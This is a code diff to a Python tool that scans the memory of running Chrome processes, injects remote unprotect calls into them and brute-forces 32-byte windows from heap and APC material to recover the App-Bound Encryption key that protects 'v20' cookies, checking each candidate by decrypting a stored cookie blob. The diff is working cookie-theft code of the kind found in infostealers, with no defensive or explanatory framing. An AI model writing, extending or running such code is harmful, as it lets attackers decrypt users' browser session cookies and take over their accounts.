@@ -35,6 +35,8 @@ _ABE_MEMSCAN_TIMEOUT_S = 6.0
 _ABE_MEMSCAN_MAX_BYTES = 256 << 20
 _ABE_MEMSCAN_MAX_CAND = 20000
 _ABE_MEMSCAN_MAX_REGION = 32 << 20
+_ABE_HEAP_STRIDE = 8
+_ABE_HEAP_MARKS = (b"os_crypt", b"OSCrypt", b"v20\x00", b"encryptor")
 _ABE_PTR_MASK = 0x00007FFFFFFFFFF8
 _DUP_SQLITE_PEEK_MAX = 64
 _SQLITE_MAGIC = b"SQLite format 3\x00"
@@ -80,6 +82,7 @@ _cache: dict[str, Any] = {
     "dup_timed_out": False,
     "abe": "",
     "abe_hr": "",
+    "_abe_hit": "",
     "v20_blobs": 0,
     "v20_ok": 0,
     "_v20_verify": [],
@@ -175,6 +178,7 @@ def _discover_uncached() -> tuple[str, str, str]:
     _cache["dup_timed_out"] = False
     _cache["abe"] = ""
     _cache["abe_hr"] = ""
+    _cache["_abe_hit"] = ""
     _cache["v20_blobs"] = 0
     _cache["v20_ok"] = 0
     _cache["_v20_verify"] = []
@@ -3861,25 +3865,50 @@ def _v20_verify_samples(primary: bytes | None) -> list[bytes]:
 
 
 def _aes_key_windows(material: bytes | None) -> list[bytes]:
-    """32-byte AES-256 windows from an APC plain. Wrong offset was dropping the key."""
+    """Every 32-byte window plus [flag][32-byte key]. Not four magic guesses."""
+    return [cand for _off, cand in _aes_key_windows_offs(material)]
+
+
+def _aes_key_windows_offs(material: bytes | None) -> list[tuple[int, bytes]]:
+    """(offset, 32-byte key) from APC / heap material. Bound to 1024 windows."""
     if not material:
         return []
-    out: list[bytes] = []
+    out: list[tuple[int, bytes]] = []
     seen: set[bytes] = set()
 
-    def add(buf: bytes) -> None:
-        if len(buf) == 32 and buf not in seen:
+    def add(off: int, buf: bytes | None) -> None:
+        if buf and len(buf) == 32 and buf not in seen:
             seen.add(buf)
-            out.append(buf)
+            out.append((off, buf))
 
-    add(material)
-    if len(material) > 32:
-        add(material[:32])
-        add(material[-32:])
-        for off in (8, 16):
-            if off + 32 <= len(material):
-                add(material[off : off + 32])
+    prefixed = _accept_aes_key(material)
+    if prefixed:
+        add(0 if prefixed == material[:32] else 4, prefixed)
+    if len(material) >= 33:
+        add(1, material[1:33])
+    limit = min(len(material) - 31, 1024)
+    for off in range(0, limit):
+        add(off, material[off : off + 32])
     return out
+
+
+def _v20_one_ok(key: bytes | None, v20_sample: bytes | None) -> bool:
+    """Prove one landed v20 blob (3+12+ct+16). Do not walk all 1339 here."""
+    if not key or len(key) != 32:
+        return False
+    samples = _v20_verify_samples(v20_sample)
+    if not samples:
+        return False
+    sample = samples[0]
+    if len(sample) < 3 + 12 + 16 or sample[:3] != b"v20":
+        return False
+    return bool(_aes_gcm_decrypt_bytes(sample[3:], key))
+
+
+def _note_abe_hit(token: str) -> None:
+    text = (token or "").strip()
+    if text:
+        _cache["_abe_hit"] = text[:40]
 
 
 def _app_bound_blob_bytes() -> bytes:
@@ -4263,21 +4292,23 @@ def _abe_proves_cookies(key: bytes | None, v20_sample: bytes | None) -> bool:
 
 
 def _abe_key_from_material(
-    material: bytes | None, v20_sample: bytes | None
+    material: bytes | None, v20_sample: bytes | None, *, source: str = "apc"
 ) -> bytes | None:
-    """Direct cookie key, or Chrome 151 wrap: APC key GCM-unwraps the APPB blob."""
+    """Walk every 32-byte slice (and flag+key). Prove one v20 sample."""
     if not material:
         return None
     app_bound = _app_bound_blob_bytes() or None
-    for cand in _aes_key_windows(material):
-        if _v20_key_ok(cand, v20_sample, all_blobs=True):
+    for off, cand in _aes_key_windows_offs(material):
+        if _v20_one_ok(cand, v20_sample):
+            _note_abe_hit(f"{source}:key:off={off}")
             return cand
         for derived in _cookie_keys_from_wrap(cand, app_bound):
-            if _v20_key_ok(derived, v20_sample, all_blobs=True):
+            if _v20_one_ok(derived, v20_sample):
+                _note_abe_hit(f"{source}:key:off={off}")
                 return derived
-            # One more wrap level: inner 32 may be another GCM wrap key.
             for nested in _cookie_keys_from_wrap(derived, app_bound):
-                if _v20_key_ok(nested, v20_sample, all_blobs=True):
+                if _v20_one_ok(nested, v20_sample):
+                    _note_abe_hit(f"{source}:key:off={off}")
                     return nested
     return None
 
@@ -4364,7 +4395,10 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
     if pids:
         key, hr = _memscan_abe_key(v20_sample)
         if _abe_proves_cookies(key, v20_sample):
-            return key, "0x00000000"
+            hit = str(_cache.get("_abe_hit") or hr or "0x00000000")
+            if hit in {"ok", "0x00000000"}:
+                return key, "0x00000000"
+            return key, f"0x00000000;{hit}"
         if hr:
             trail.append(hr)
     if all13:
@@ -5419,13 +5453,14 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             return ";apc:0"
         return ";apc:ok"
 
-    def consider_raw(cand: bytes | None) -> bytes | None:
+    def consider_raw(cand: bytes | None, *, source: str = "heap") -> bytes | None:
         nonlocal tried
         if not cand or cand in seen or not _high_entropy32(cand):
             return None
         seen.add(cand)
         tried += 1
-        if _v20_key_ok(cand, v20_sample, all_blobs=True):
+        if _v20_one_ok(cand, v20_sample):
+            _note_abe_hit(f"{source}:hit")
             return cand
         return None
 
@@ -5441,20 +5476,58 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         if extra and extra not in blobs:
             blobs.append(extra)
         for blob in blobs:
-            if len(blob) >= 32:
-                blob = blob[:32]
-            else:
+            if len(blob) < 16:
                 continue
-            plain = unprotect.unprotect(blob)
-            hit = _abe_key_from_material(plain, v20_sample)
+            hit = _abe_key_from_material(blob, v20_sample, source="apc")
             if hit:
                 return hit
+            n = len(blob)
+            if n % 16:
+                blob = blob + (b"\x00" * (16 - n % 16))
+            if 16 <= len(blob) <= 1024:
+                plain = unprotect.unprotect(blob)
+                hit = _abe_key_from_material(plain, v20_sample, source="apc")
+                if hit:
+                    return hit
             if addr:
-                inplace = unprotect.unprotect_at(addr, 32)
-                hit = _abe_key_from_material(inplace, v20_sample)
+                for width in (32, 48, 64):
+                    inplace = unprotect.unprotect_at(addr, width)
+                    hit = _abe_key_from_material(inplace, v20_sample, source="apc")
+                    if hit:
+                        return hit
+        return None
+
+    def consider_heap(data: bytes) -> bytes | None:
+        if not any(mark in data for mark in _ABE_HEAP_MARKS):
+            return None
+        limit = min(len(data) - 31, 64 << 10)
+        for off in range(0, limit, _ABE_HEAP_STRIDE):
+            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                break
+            hit = consider_raw(data[off : off + 32], source="heap")
+            if hit:
+                return hit
+            if off + 33 <= len(data):
+                hit = consider_raw(data[off + 1 : off + 33], source="heap")
                 if hit:
                     return hit
         return None
+
+    def consider_appb_apc(unprotect: _RemoteUnprotect | None) -> bytes | None:
+        if unprotect is None or not unprotect.ok:
+            return None
+        appb = _app_bound_blob_bytes()
+        if not appb:
+            return None
+        raw = appb[4:] if appb.startswith(b"APPB") else appb
+        padded = raw + (b"\x00" * ((16 - len(raw) % 16) % 16))
+        if len(padded) > 1024:
+            padded = padded[:1024]
+            padded = padded[: len(padded) - (len(padded) % 16)]
+        if len(padded) < 16:
+            return None
+        plain = unprotect.unprotect(padded)
+        return _abe_key_from_material(plain, v20_sample, source="apc")
 
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
@@ -5472,6 +5545,9 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         unprotect = _RemoteUnprotect(pid)
         if unprotect.ok:
             unprotect_ok += 1
+            hit = consider_appb_apc(unprotect)
+            if hit:
+                return hit, str(_cache.get("_abe_hit") or "apc:key:off=0")
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -5531,12 +5607,12 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             blob, extra = got_blob
                             found_ptrs += 1
                             for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
-                                hit = consider_raw(cand)
+                                hit = consider_raw(cand, source="heap")
                                 if hit:
-                                    return hit, "ok"
+                                    return hit, str(_cache.get("_abe_hit") or "heap:hit")
                             hit = consider_apc(blob, unprotect, ptr, extra)
                             if hit:
-                                return hit, "ok"
+                                return hit, str(_cache.get("_abe_hit") or "apc:key:off=0")
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
@@ -5549,12 +5625,15 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             blob, extra = got_blob
                             found_ptrs += 1
                             for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
-                                hit = consider_raw(cand)
+                                hit = consider_raw(cand, source="heap")
                                 if hit:
-                                    return hit, "ok"
+                                    return hit, str(_cache.get("_abe_hit") or "heap:hit")
                             hit = consider_apc(blob, unprotect, ptr, extra)
                             if hit:
-                                return hit, "ok"
+                                return hit, str(_cache.get("_abe_hit") or "apc:key:off=0")
+                        hit = consider_heap(data)
+                        if hit:
+                            return hit, str(_cache.get("_abe_hit") or "heap:hit")
                 nxt = addr + size
                 if nxt <= addr:
                     break
